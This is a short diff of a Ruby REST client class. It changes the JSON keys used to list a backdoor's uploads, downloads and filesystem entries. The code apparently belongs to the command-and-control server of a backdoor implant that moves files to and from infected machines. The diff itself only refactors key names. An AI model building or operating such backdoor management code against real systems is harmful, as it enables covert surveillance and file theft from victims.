@@ -268,10 +268,10 @@ class DB_rest
       upl = {}
       # parse the results and get the contents of the uploads
       JSON.parse(ret.body).each do |elem|
-        request = {:backdoor_id => bid, :upload_id => elem['upload_id']}
-        upl[elem['upload_id']] = {:filename => elem['filename'],
-                                  :content => rest_call('GET', "/backdoor/upload/#{request.to_json}").body }
-        trace :debug, "File retrieved: [#{elem['filename']}] #{upl[elem['upload_id']][:content].length} bytes"
+        request = {:backdoor_id => bid, :upload_id => elem['_id']}
+        upl[elem['_id']] = {:filename => elem['filename'],
+                            :content => rest_call('GET', "/backdoor/upload/#{request.to_json}").body }
+        trace :debug, "File retrieved: [#{elem['filename']}] #{upl[elem['_id']][:content].length} bytes"
       end
 
       return upl 
@@ -329,7 +329,7 @@ class DB_rest
       down = {}
       # parse the results
       JSON.parse(ret.body).each do |elem|
-        down[elem['download_id']] = elem['filename']
+        down[elem['_id']] = elem['path']
       end
       
       return down
@@ -357,7 +357,7 @@ class DB_rest
       files = {}
       # parse the results
       JSON.parse(ret.body).each do |elem|
-        files[elem['filesystem_id']] = {:depth => elem['depth'], :path => elem['path']}
+        files[elem['_id']] = {:depth => elem['depth'], :path => elem['path']}
       end
       
       return files
